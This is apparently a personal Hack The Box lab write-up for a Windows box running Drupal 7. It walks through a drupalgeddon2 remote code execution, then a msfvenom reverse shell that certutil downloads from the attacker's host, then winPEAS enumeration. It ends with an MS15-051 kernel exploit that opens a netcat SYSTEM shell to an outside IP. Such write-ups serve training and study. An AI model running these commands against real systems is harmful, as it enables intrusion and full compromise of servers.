#hackthebox 

# Initial Nmap Scan

![Pasted image 20230226150002](https://user-images.githubusercontent.com/71300144/221735826-50b162e2-7584-45bb-b39f-fcbe99914bd9.png)

# Website on 80

![Pasted image 20230226145848](https://user-images.githubusercontent.com/71300144/221735898-9192a8ee-a7d7-4f4a-bb92-65d8314db46c.png)

Technologies include 
- Drupal 7
- IIS 7.5
- PHP 5.3.28
- JQuery

There were quite a bit of directories that showed up in the nmap scan first to check out is robots.txt

![Pasted image 20230226150140](https://user-images.githubusercontent.com/71300144/221735945-bb3cd635-9902-4f09-930e-597cf52e0fa7.png)

The Disallow entires

![Pasted image 20230226150235](https://user-images.githubusercontent.com/71300144/221735996-2cb9823a-ea2f-4eee-ba0c-6ece8ce6057d.png)

After checking out all of these entires and running sqlmap on the login page I decided to look at searchsploit since I was having no luck at finding an vulnerability.

# Searchsploit Drupal 7
I saw that there was a ton of exploits available for Drupal 7 and that there was remote code execution RCE 

![Pasted image 20230227185430](https://user-images.githubusercontent.com/71300144/221736047-4a1c2ded-3a7d-488c-9e2a-3dc81febc7cd.png)

The RCE execution was written in PHP and requires authenticated access which I was unable to get as I was not able to create an account.

- After a ton of googling and trying different Drupal exploits I found one that worked located here --> https://github.com/lorddemon/drupalgeddon2/blob/master/drupalgeddon2.py

Fire off the Exploit `python3 drupelgeddon2.py http://10.10.10.9 -c "whoami"`

![Pasted image 20230227192853](https://user-images.githubusercontent.com/71300144/221736092-c6089d98-400b-4338-9b21-8cd770460fa4.png)

There it is Finally command execution, now lets make a reverse shell download it and  execute it.

`msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.7 LPORT=443 -f exe > drupel.exe`

After the shell compiles, drop it on the target machine with certutil

`python3 drupelgeddon2.py http://10.10.10.9 -c "certutil.exe -urlcache -f http://10.10.14.7:8081/drupel.exe drupel.exe"`

As I was doing this I realized I did not know wher I was dropping this executable on the system but decided to just try and run it anyway to see if it worked and it did lickily. If not I would have to find a directory I can write in or make another directory.

Now it is time to execute the reverse shell that I dropped on the machine

`python3 drupelgeddon2.py http://10.10.10.9 -c ".\drup.exe"  `

![Pasted image 20230226161438](https://user-images.githubusercontent.com/71300144/221736185-ea7f380b-ba79-4550-af06-3455b82c5e51.png)

# Post Enumeration

lets upload winPEAS dowload or locate winpeas on your system 

host a a simple http server to pull from `python3 -m http.server 8081`

download winpeas `certutil -urlcache -f http://10.10.14.7:8081/winPEAS.bat winpeas.bat`

run winpeas `.\winpeas.bat`

On almost all windows machines I find that winPEAS.exe will trigger windows defender and will not be able to run but I have not had a problem with winpeas.bat so it is my go too.

![Pasted image 20230227195103](https://user-images.githubusercontent.com/71300144/221736240-939a3140-de8d-4a7b-b71e-23590b3915da.png)

After running and trying multiple kernal exploits, losing my shell multiple times and throwing exploits at it, I found one that works, which took me a couple of hours, but I did it!!

![Pasted image 20230227195643](https://user-images.githubusercontent.com/71300144/221736299-76c0b1f1-cb91-4423-a193-07ed250d74d4.png)

# Kernal Exploit MS15-051

I performed the following to get a NT Authority/System

- spin up a simple http server and host the exploit MS15-051 and use target system with certutil to download

Executable found --> https://github.com/SecWiki/windows-kernel-exploits/blob/master/MS15-051/MS15-051-KB3045171.zip

- C:\temp>`certutil -urlcache -f http://10.10.14.7:8081/nc.exe nc.exe`
	

- C:\temp>`certutil -urlcache -f http://10.10.14.7:8081/ms15-051x64.exe ms15.exe`
	

- Set up a nc listener and use the below command to fire the exploit.

`C:\temp>ms15.exe "nc.exe 10.10.14.7 4444 -e cmd.exe`

![Pasted image 20230227184426](https://user-images.githubusercontent.com/71300144/221736361-d29498b1-35b9-4934-991b-27ce06437fe4.png)

# Box Owned!

